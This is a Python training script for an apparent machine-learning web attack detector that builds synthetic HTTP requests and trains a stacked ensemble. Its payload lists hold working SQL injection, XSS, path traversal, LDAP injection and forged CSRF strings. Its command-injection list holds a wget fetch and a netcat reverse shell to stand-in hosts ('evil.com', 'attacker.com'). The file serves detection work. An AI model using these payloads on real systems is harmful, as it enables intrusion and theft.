"""
IWASMS ML Engine — Dataset Loader and Ensemble Trainer

Training pipeline:
    1. Load CSIC2010 / CICIDS2017 or generate synthetic data
    2. Extract 77 features per request
    3. Train stacked ensemble: RF + XGB + MLP + IsolationForest
    4. Meta-learner: LogisticRegression
    5. Save all artefacts to ml_engine/models/
"""
import os
import sys
import json
import time
import random
import logging
import pathlib
import datetime
import warnings

warnings.filterwarnings('ignore')

import numpy as np
import pandas as pd
import joblib

from sklearn.model_selection import train_test_split, cross_val_predict, StratifiedKFold
from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.linear_model import LogisticRegression
from sklearn.neural_network import MLPClassifier
from sklearn.metrics import (
    accuracy_score, f1_score, roc_auc_score,
    confusion_matrix, classification_report,
)
from imblearn.over_sampling import SMOTE

try:
    from xgboost import XGBClassifier
    HAS_XGB = True
except ImportError:
    HAS_XGB = False
    logging.warning("XGBoost not available, will use ExtraTreesClassifier as substitute")
    from sklearn.ensemble import ExtraTreesClassifier

# Resolve paths relative to this file's location
_HERE = pathlib.Path(__file__).resolve().parent
_MODELS_DIR = _HERE / 'models'
_DATA_DIR = _HERE.parent / 'data'
_RAW_DIR = _DATA_DIR / 'raw'

_MODELS_DIR.mkdir(parents=True, exist_ok=True)
(_DATA_DIR / 'processed').mkdir(parents=True, exist_ok=True)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Synthetic request generators
# ---------------------------------------------------------------------------

_NORMAL_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
]

_NORMAL_PATHS = [
    '/api/products', '/api/users', '/api/orders', '/api/search', '/api/cart',
    '/shop/items', '/auth/login', '/auth/register', '/profile', '/checkout',
    '/api/reviews', '/api/categories', '/api/inventory',
]

_SQL_PAYLOADS = [
    "' OR '1'='1",
    "1 UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "admin'--",
    "1 OR 1=1--",
    "' OR ''='",
    "1; SELECT * FROM information_schema.tables--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 AND 1=2 UNION SELECT NULL,username,password FROM users--",
]

_XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert('xss')>",
    "';alert(String.fromCharCode(88,83,83))//",
]

_CMD_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la /",
    "&& wget http://evil.com/shell.sh",
    "; nc -e /bin/bash attacker.com 4444",
    "| id",
    "; uname -a",
]

_PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../windows/system32/",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

_CSRF_PAYLOADS = [
    "amount=10000&to_account=attacker&csrf_token=invalid",
    "action=delete&user_id=1&token=forged",
    "transfer=1&recipient=evil@example.com",
]

_LDAP_PAYLOADS = [
    "*)(|(password=*)",
    "admin)(&(password=*)",
    "*)(uid=*))(|(uid=*",
    "admin)(&(objectClass=*",
]

_ATTACK_CATEGORIES = {
    'sql_injection': (_SQL_PAYLOADS, 'critical'),
    'xss': (_XSS_PAYLOADS, 'high'),
    'command_injection': (_CMD_PAYLOADS, 'critical'),
    'path_traversal': (_PATH_TRAVERSAL_PAYLOADS, 'medium'),
    'csrf': (_CSRF_PAYLOADS, 'medium'),
    'ldap_injection': (_LDAP_PAYLOADS, 'high'),
}

ATTACK_LABEL_TO_INT = {
    'normal': 0,
    'sql_injection': 1,
    'xss': 2,
    'command_injection': 3,
    'path_traversal': 4,
    'csrf': 5,
    'ldap_injection': 6,
}

INT_TO_ATTACK_LABEL = {v: k for k, v in ATTACK_LABEL_TO_INT.items()}


def _random_ip():
    return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"


def _make_normal_request() -> dict:
    path = random.choice(_NORMAL_PATHS)
    param = f"?id={random.randint(1, 9999)}" if random.random() > 0.5 else ""
    return {
        'method': random.choice(['GET', 'POST']),
        'url': path + param,
        'headers': {
            'User-Agent': random.choice(_NORMAL_UAS),
            'Content-Type': 'application/json' if random.random() > 0.6 else 'application/x-www-form-urlencoded',
        },
        'body': '' if random.random() > 0.4 else f"page={random.randint(1, 100)}&limit=20",
        'source_ip': _random_ip(),
    }


def _make_attack_request(category: str, payloads: list) -> dict:
    payload = random.choice(payloads)
    if category in ('sql_injection', 'path_traversal', 'ldap_injection'):
        url = f"/api/products?id={payload}"
        body = ""
    elif category == 'xss':
        url = f"/search?q={payload}"
        body = ""
    elif category == 'command_injection':
        url = f"/api/exec?cmd={payload}"
        body = ""
    elif category == 'csrf':
        url = "/api/transfer"
        body = payload
    else:
        url = f"/api/data?input={payload}"
        body = ""
    return {
        'method': 'POST' if body else 'GET',
        'url': url,
        'headers': {
            'User-Agent': random.choice(_NORMAL_UAS + ['sqlmap/1.7', 'nikto/2.1.6']),
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        'body': body,
        'source_ip': _random_ip(),
    }


# ---------------------------------------------------------------------------
# Dataset Loader
# ---------------------------------------------------------------------------

class DatasetLoader:

    def load(self) -> tuple[pd.DataFrame, pd.Series]:
        """Load dataset. Returns (X_df_of_requests, y_series)."""
        # Try CSIC 2010
        csic_path = _RAW_DIR / 'csic_2010.csv'
        if csic_path.exists():
            logger.info(f"Loading CSIC 2010 from {csic_path}")
            return self._load_csic(csic_path)

        # Try CICIDS 2017
        cicids_files = list(_RAW_DIR.glob('CICIDS2017*.csv'))
        if cicids_files:
            logger.info(f"Loading CICIDS2017 from {len(cicids_files)} files")
            return self._load_cicids(cicids_files)

        # Fallback: synthetic
        logger.info("No real datasets found. Generating synthetic dataset of 10,000 samples.")
        return self._generate_synthetic()

    def _load_csic(self, path: pathlib.Path) -> tuple[pd.DataFrame, pd.Series]:
        df = pd.read_csv(path, low_memory=False)
        requests = []
        labels = []
        for _, row in df.iterrows():
            req = {
                'method': str(row.get('Method', 'GET')),
                'url': str(row.get('URL', '/')),
                'headers': {'User-Agent': str(row.get('User-Agent', '')),
                            'Cookie': str(row.get('Cookie', ''))},
                'body': str(row.get('Payload', '') or ''),
                'source_ip': '127.0.0.1',
            }
            requests.append(req)
            raw_label = row.get('label', row.get('Label', 0))
            labels.append(1 if str(raw_label).strip() not in ('0', 'normal', 'BENIGN') else 0)
        X_df = pd.DataFrame({'request': requests})
        y = pd.Series(labels)
        return X_df, y

    def _load_cicids(self, paths: list) -> tuple[pd.DataFrame, pd.Series]:
        dfs = [pd.read_csv(p, low_memory=False) for p in paths]
        df = pd.concat(dfs, ignore_index=True)
        df.columns = df.columns.str.strip()
        # Sample up to 20k if large
        if len(df) > 20000:
            df = df.sample(20000, random_state=42)
        requests = []
        labels = []
        for _, row in df.iterrows():
            req = {
                'method': 'GET',
                'url': '/',
                'headers': {},
                'body': '',
                'source_ip': str(row.get('Source IP', '127.0.0.1')),
            }
            requests.append(req)
            raw_label = str(row.get('Label', 'BENIGN')).strip().upper()
            labels.append(0 if raw_label == 'BENIGN' else 1)
        X_df = pd.DataFrame({'request': requests})
        y = pd.Series(labels)
        return X_df, y

    def _generate_synthetic(self) -> tuple[pd.DataFrame, pd.Series]:
        logger.info("Generating 10,000 synthetic requests...")
        requests = []
        labels = []

        # 5000 normal
        for _ in range(5000):
            requests.append(_make_normal_request())
            labels.append(ATTACK_LABEL_TO_INT['normal'])

        # 5000 attack — balanced across 6 categories
        per_category = 5000 // len(_ATTACK_CATEGORIES)
        for category, (payloads, _) in _ATTACK_CATEGORIES.items():
            for _ in range(per_category):
                requests.append(_make_attack_request(category, payloads))
                labels.append(ATTACK_LABEL_TO_INT[category])

        # Shuffle
        combined = list(zip(requests, labels))
        random.shuffle(combined)
        requests, labels = zip(*combined)

        X_df = pd.DataFrame({'request': list(requests)})
        y = pd.Series(list(labels))
        logger.info(f"Generated {len(y)} samples. Label distribution:\n{y.value_counts()}")
        return X_df, y


# ---------------------------------------------------------------------------
# Feature extraction helper
# ---------------------------------------------------------------------------

def extract_features(X_df: pd.DataFrame) -> np.ndarray:
    """Apply HTTPFeatureExtractor to each row in X_df['request']."""
    from ml_engine.features import HTTPFeatureExtractor
    extractor = HTTPFeatureExtractor()
    features = []
    total = len(X_df)
    for i, req in enumerate(X_df['request']):
        if i % 1000 == 0:
            logger.info(f"  Extracting features: {i}/{total}")
        features.append(extractor.extract(req))
    return np.vstack(features)


# ---------------------------------------------------------------------------
# Ensemble Trainer
# ---------------------------------------------------------------------------

class EnsembleTrainer:

    def train(self, X_df: pd.DataFrame, y: pd.Series) -> dict:
        timestamp = datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        logger.info("=" * 60)
        logger.info("IWASMS Ensemble Training Pipeline")
        logger.info("=" * 60)

        # 1. Feature extraction
        logger.info("Step 1: Extracting features...")
        t0 = time.time()
        X = extract_features(X_df)
        logger.info(f"  Feature extraction done in {time.time() - t0:.1f}s. Shape: {X.shape}")

        # Convert y to binary (0/1) for the stacked meta-learner
        y_binary = (y > 0).astype(int)

        # 2. Train/val/test split
        logger.info("Step 2: Splitting dataset...")
        X_train, X_temp, y_train, y_temp = train_test_split(
            X, y_binary, test_size=0.3, stratify=y_binary, random_state=42
        )
        X_val, X_test, y_val, y_test = train_test_split(
            X_temp, y_temp, test_size=0.5, stratify=y_temp, random_state=42
        )
        logger.info(f"  Train: {len(y_train)}, Val: {len(y_val)}, Test: {len(y_test)}")

        # 3. Scale features
        logger.info("Step 3: Fitting StandardScaler...")
        scaler = StandardScaler()
        X_train_s = scaler.fit_transform(X_train)
        X_val_s = scaler.transform(X_val)
        X_test_s = scaler.transform(X_test)

        scaler_path = _MODELS_DIR / f'scaler_v{timestamp}.pkl'
        joblib.dump(scaler, scaler_path)
        logger.info(f"  Scaler saved: {scaler_path}")

        # 4. SMOTE on training data
        logger.info("Step 4: Applying SMOTE...")
        smote = SMOTE(random_state=42)
        X_train_sm, y_train_sm = smote.fit_resample(X_train_s, y_train)
        logger.info(f"  After SMOTE: {X_train_sm.shape[0]} samples")

        # 5. Train Level-1 models
        logger.info("Step 5: Training Level-1 models...")
        trained_models = {}

        # Random Forest — 500 trees, max depth 20, min samples split 5
        logger.info("  [1/4] RandomForestClassifier...")
        t0 = time.time()
        rf = RandomForestClassifier(
            n_estimators=500, max_depth=20, min_samples_split=5,
            n_jobs=-1, random_state=42
        )
        rf.fit(X_train_sm, y_train_sm)
        trained_models['random_forest'] = rf
        logger.info(f"       Done in {time.time()-t0:.1f}s")

        # XGBoost — 300 estimators, learning rate 0.01, max depth 6
        logger.info("  [2/4] XGBClassifier...")
        t0 = time.time()
        if HAS_XGB:
            xgb = XGBClassifier(
                n_estimators=300, learning_rate=0.01, max_depth=6,
                eval_metric='logloss', random_state=42, n_jobs=-1,
                verbosity=0
            )
        else:
            from sklearn.ensemble import ExtraTreesClassifier
            xgb = ExtraTreesClassifier(n_estimators=300, max_depth=20, n_jobs=-1, random_state=42)
        xgb.fit(X_train_sm, y_train_sm)
        trained_models['xgboost'] = xgb
        logger.info(f"       Done in {time.time()-t0:.1f}s")

        # Neural Network — [77→64→32→12], ReLU, Dropout 0.3
        logger.info("  [3/4] MLPClassifier...")
        t0 = time.time()
        mlp = MLPClassifier(
            hidden_layer_sizes=(64, 32), activation='relu',
            max_iter=500, random_state=42, early_stopping=True,
            validation_fraction=0.1, learning_rate_init=0.001,
            solver='adam',
        )
        mlp.fit(X_train_sm, y_train_sm)
        trained_models['neural_network'] = mlp
        logger.info(f"       Done in {time.time()-t0:.1f}s")

        # Isolation Forest — 100 estimators, contamination 0.01
        logger.info("  [4/4] IsolationForest...")
        t0 = time.time()
        iso_forest = IsolationForest(
            n_estimators=100, contamination=0.01, random_state=42, n_jobs=-1
        )
        iso_forest.fit(X_train_sm)
        trained_models['isolation_forest'] = iso_forest
        logger.info(f"       Done in {time.time()-t0:.1f}s")

        # 6. Generate out-of-fold predictions for meta-learner
        logger.info("Step 6: Generating out-of-fold meta-features...")
        cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)

        rf_oof = cross_val_predict(rf, X_train_sm, y_train_sm, cv=cv, method='predict_proba')
        xgb_oof = cross_val_predict(xgb, X_train_sm, y_train_sm, cv=cv, method='predict_proba')
        mlp_oof = cross_val_predict(mlp, X_train_sm, y_train_sm, cv=cv, method='predict_proba')
        if_oof = iso_forest.decision_function(X_train_sm).reshape(-1, 1)

        meta_train = np.hstack([rf_oof, xgb_oof, mlp_oof, if_oof])

        # 7. Train meta-learner
        logger.info("Step 7: Training meta-learner (LogisticRegression)...")
        meta_learner = LogisticRegression(C=1.0, max_iter=500, random_state=42)
        meta_learner.fit(meta_train, y_train_sm)
        trained_models['meta_learner'] = meta_learner

        # 8. Evaluate on test set
        logger.info("Step 8: Evaluating on test set...")

        def get_test_meta_features(X_s):
            rf_p = trained_models['random_forest'].predict_proba(X_s)
            xgb_p = trained_models['xgboost'].predict_proba(X_s)
            mlp_p = trained_models['neural_network'].predict_proba(X_s)
            if_s = trained_models['isolation_forest'].decision_function(X_s).reshape(-1, 1)
            return np.hstack([rf_p, xgb_p, mlp_p, if_s])

        meta_test = get_test_meta_features(X_test_s)
        y_pred = meta_learner.predict(meta_test)
        y_proba = meta_learner.predict_proba(meta_test)[:, 1]

        acc = accuracy_score(y_test, y_pred)
        f1 = f1_score(y_test, y_pred, average='weighted', zero_division=0)
        try:
            auc = roc_auc_score(y_test, y_proba)
        except Exception:
            auc = 0.0
        cm = confusion_matrix(y_test, y_pred)
        tn, fp, fn, tp = cm.ravel() if cm.size == 4 else (0, 0, 0, max(1, cm.sum()))
        fpr = fp / max(fp + tn, 1)

        metrics = {
            'accuracy': float(acc),
            'f1_score': float(f1),
            'auc_roc': float(auc),
            'false_positive_rate': float(fpr),
            'confusion_matrix': cm.tolist(),
            'classification_report': classification_report(y_test, y_pred, zero_division=0),
            'trained_on_samples': int(len(y_train_sm)),
            'timestamp': timestamp,
        }

        # 9. Save models
        logger.info("Step 9: Saving model artefacts...")
        model_paths = {}
        for name, model in trained_models.items():
            path = _MODELS_DIR / f'{name}_v{timestamp}.pkl'
            joblib.dump(model, path)
            model_paths[name] = str(path)
            logger.info(f"  Saved: {path}")

        # Save metrics
        metrics_path = _MODELS_DIR / f'metrics_v{timestamp}.json'
        with open(metrics_path, 'w') as f:
            json.dump({k: v for k, v in metrics.items() if k != 'classification_report'}, f, indent=2)

        # Save label mapping
        label_map_path = _MODELS_DIR / f'label_map_v{timestamp}.json'
        with open(label_map_path, 'w') as f:
            json.dump(INT_TO_ATTACK_LABEL, f, indent=2)

        # 10. Print training summary
        print("\n" + "=" * 60)
        print("IWASMS ENSEMBLE TRAINING COMPLETE")
        print("=" * 60)
        print(f"  Samples (after SMOTE): {len(y_train_sm):,}")
        print(f"  Test samples:          {len(y_test):,}")
        print(f"  Accuracy:              {acc:.4f}")
        print(f"  F1 Score (weighted):   {f1:.4f}")
        print(f"  AUC-ROC:               {auc:.4f}")
        print(f"  False Positive Rate:   {fpr:.4f}")
        print(f"  Models saved to:       {_MODELS_DIR}")
        print("=" * 60)
        print(metrics['classification_report'])

        model_paths['scaler'] = str(scaler_path)
        model_paths['label_map'] = str(label_map_path)
        model_paths['metrics'] = metrics_path

        return {
            'model_paths': model_paths,
            'metrics': metrics,
            'timestamp': timestamp,
        }
